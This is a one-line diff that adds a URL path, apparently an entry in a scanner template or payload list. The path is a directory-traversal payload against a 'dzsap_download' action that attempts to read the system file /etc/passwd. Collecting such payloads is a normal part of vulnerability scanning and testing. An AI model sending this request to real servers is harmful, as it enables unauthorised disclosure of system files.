@@ -1,0 +1,1 @@
+/?action=dzsap_download&link=../../../../../../../../../../../../../etc/passwd
